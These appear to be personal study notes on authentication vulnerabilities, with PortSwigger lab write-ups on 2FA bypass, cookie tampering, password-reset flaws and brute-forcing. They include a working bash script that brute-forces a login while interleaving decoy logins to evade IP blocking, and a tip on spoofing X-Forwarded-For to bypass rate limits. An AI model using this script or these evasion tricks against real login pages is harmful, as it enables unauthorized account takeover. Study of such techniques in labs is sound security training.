# Authentication Vulnerabilities

## The Hacker's Mindset

> _**"Vulnerabilities don’t live on checklists. They hide in assumptions, behaviors, and overlooked logic. My job is to question everything."**_
>
> _**"Don’t look for vulnerabilities. Understand the system. Understand the user. Then break what no one thought to test."**_
>
> _**"Every request is a conversation. Every token, a potential key. Stay curious. Stay persistent. Stay ethical."**_
>
> _**"I am not here to follow steps. I’m here to think deeply, test wildly, and uncover the unexpected."**_

{% hint style="info" %}
_<mark style="color:red;">**"Observe deeply. Test creatively. Question everything."**</mark>_&#x20;
{% endhint %}

## What is Authentication ?&#x20;

**Authentication** verifies _who_ you are; **authorization** determines _what_ you can access.

## What are we after ?&#x20;

* _**Weak / Default Credentials**_
* _**Username Enumeration**_
  * _via Error Messages_
  * _via Timing Responses_
  * _via Forgot Password Flows_
* _**Credential Brute-Forcing**_
* _**Password Reset Misuse**_
  * _Reset token reuse_
  * _Changing other users' passwords_
* _**Insecure "Stay Logged In" Mechanisms**_
  * _Decoding / Tampering auth cookies or tokens_
* _**Bypassing Multi-Factor Authentication (MFA)**_
* _**Improper Session Handling Post-Auth**_
  * _Session fixation_
  * _Session not invalidated on logout/password change_
* _**Auth Logic Flaws**_
  * _Skipping login via forced browsing_
  * _Using user-controlled parameters in logic decisions_

***

## Username Enumeration

### Via Brute force

While attempting to brute-force a login page, you should pay attention to any differences in:&#x20;

* **Status codes \[**_Successful login usually returns status code **`302`** for valid credentials_**]**
* **Error Messages \[**_**`Incorrect username`, `Incorrect Password`**_**]**
* **If the account gets locked out.**
* **Response times \[** _use a large password such as `holholaholaholaholahola` while username enumeration using bruteforce so that we can get somewhat accurate response time for correct username_**]**

{% hint style="info" %}
The correct username causes a delayed response due to password verification, while incorrect usernames fail faster. Using varied IPs via the `X-Forwarded-For` header helps bypass rate limits.
{% endhint %}

* **Different Responses**

{% hint style="info" %}
_In username enumeration, observe subtle differences in server responses for valid vs. invalid usernames. Intercept and save responses, then compare side-by-side in Mousepad for analysis._
{% endhint %}

### Broken brute-force protection, IP block

With one valid login credentials and a known username, we can brute-force by alternating each password attempt with a decoy login to avoid detection, repeating until the correct password is found.

Use this type of script and let it running&#x20;

```bash
#!/bin/bash

# Target and decoy login info
url="https://<target_url>/login"
valid_user="target_username"
decoy_user="known_username"
decoy_pass="known_password"

# Color definitions
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
NC='\033[0m' # No Color

# Start brute-force loop
while read -r test_pass; do
    echo -e "${CYAN}[*] Trying: $valid_user / $test_pass${NC}"

    status_code=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "$url" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=$valid_user&password=$test_pass")

    if [ "$status_code" -eq 302 ]; then
        echo -e "${GREEN}[+] SUCCESS! Password for '$valid_user' is: $test_pass${NC}"
        exit 0
    else
        echo -e "${RED}[-] Failed attempt.${NC}"
        echo -e "${YELLOW}[*] Sending decoy login: $decoy_user / $decoy_pass${NC}"

        curl -s -o /dev/null -w "%{http_code}" \
            -X POST "$url" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "username=$decoy_user&password=$decoy_pass" > /dev/null

        echo -e "${YELLOW}[✓] Decoy login sent.${NC}"
    fi
done < passwords.txt

```

## Vulnerabilities in Multi-factor authentication

**2FA/MFA** is a security method that requires two or more verification steps (like a password and a code from your phone).\
**Why useful:** It adds extra protection even if your password is stolen.&#x20;

**Exploit:** Poorly implemented two-factor authentication can be beaten, or even bypassed entirely, just as single-factor authentication can.

### Lab: 2FA simple bypass \[_Portswigger]_

In this lab, we were provided with two sets of credentials:

* **`wiener:peter`** – MFA code accessible via email
* **`carlos:montoya`** – No access to MFA code

**🔍 Observations:**

* Logging in with **wiener** redirects to `/login2` for the 2FA prompt after successful credential submission.
* After submitting the correct MFA code, the application redirects to `/my-account?id=wiener`.

**🎯 Exploitation Steps:**

1. Logged in as **`carlos`** using correct credentials.
2. Intercepted the server's response that redirects to `/login2`.
3. Modified the redirection path to `/my-account?id=carlos`.
4. Forwarded the modified response to the browser.
5. Successfully accessed Carlos's account **without providing the 2FA code**.

**✅ Outcome:**

By manipulating the post-login redirect, I bypassed the 2FA mechanism and gained unauthorized access to Carlos’s account.

### Lab: 2FA Broken Login

In this lab, we were given:

* Valid credentials: **wiener:peter**
* Valid username (no credentials): **carlos**

**🔍 Observations:**

* After logging in with valid credentials, the application redirects to `/login2` to prompt for an MFA code.
* During this flow, a cookie is set that includes the username for whom the MFA is being verified.
* The MFA verification is based on this cookie value, **not the original login session**.

**🎯 Exploitation Steps:**

1. Logged in using _`wiener:peter`_ and intercepted the response.
2. Modified the cookie in the response to replace `wiener` with `carlos`.
3. Sent a `GET /login2` request — now requesting an MFA code for **carlos** instead of **wiener**.
4. Used **ffuf** to brute-force the MFA code for **carlos**.
5. Supplied the correct code and successfully logged in as **carlos**.

**✅ Outcome:**

By tampering with the cookie that determines the user for whom the MFA code is validated, I bypassed the intended flow and gained access to another user’s account.

## Vulnerabilities in other authentication mechanism

### Lab: Brute-forcing a stay-logged-in cookie

In this lab, we were given valid credentials (`wiener:peter`) and a valid username (`carlos`). Upon logging in as `wiener`, I observed that the application issues a "stay logged in" cookie.

* The cookie is Base64-encoded.
* The decoded value follows the format: `username:md5(password)`\
  For example, `wiener:md5(peter)` → Base64 → `d2llbmVyOm<...>`.

**🛠 Exploitation Steps:**

1. Logged in as `wiener:peter` and captured the cookie format.
2. Created a wordlist of possible passwords for `carlos`.
3. Generated cookies using the format `carlos:md5(password)` and encoded them in Base64.
4. Brute-forced the `stay-logged-in` cookie by testing each generated value in the `Cookie` header or browser storage.
5. Upon receiving a `200 OK` response, successfully authenticated as `carlos` without needing the original password.

**✅ Lesson:**

> Do not store authentication credentials (even hashed) in client-side cookies. Always sign or encrypt sensitive data securely, and validate sessions server-side.

### Lab: Password reset broken logic

**Always verify whether the backend properly validates password reset tokens.** In this lab, the server accepted any valid token and allowed the username to be changed in the request, enabling a password reset for other users. Always test if the token is correctly bound to the intended user on the server side.

> Sometime the application will try to send an email to the respective user's email address. So what we can do is, we'll try to add an extra email parameter either in JSON or normal parameter and if the application accepts it then boom. We can reset another user password.&#x20;

### Lab: Password Brute-Force via Password Change

In this lab, I logged in using the provided credentials and navigated to the “Change Password” section. The form required the current password and two entries for the new password.

I observed that:

* When the current password was incorrect, it returned an "Incorrect password" message.
* When the two new passwords didn’t match, it showed a "Password mismatch" error.

To brute-force the current password without changing it, I submitted mismatched new passwords intentionally. This way, the actual password wouldn’t be updated even if a correct guess was made. I captured this request and used **ffuf** to automate the brute-force process, identifying the valid password based on the response.

## Remaining

### SSO

### Unknown host redirect
